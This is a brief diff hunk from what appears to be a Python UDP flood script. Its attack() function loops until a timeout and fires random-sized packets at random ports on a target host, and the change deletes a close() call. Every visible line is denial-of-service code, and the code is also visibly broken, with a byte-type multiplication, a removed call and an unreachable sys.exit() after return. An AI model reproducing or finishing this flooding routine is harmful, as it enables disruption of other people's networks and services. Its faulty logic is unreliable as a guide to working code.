@@ -21,7 +21,7 @@ def attack():
     while time.time() < timeout:
         dport = random.randint(20,55500)
         sock.sendto(bytes*random.randint(5,15),(target, dport))
-        close()
+        
         return
         sys.exit()
 
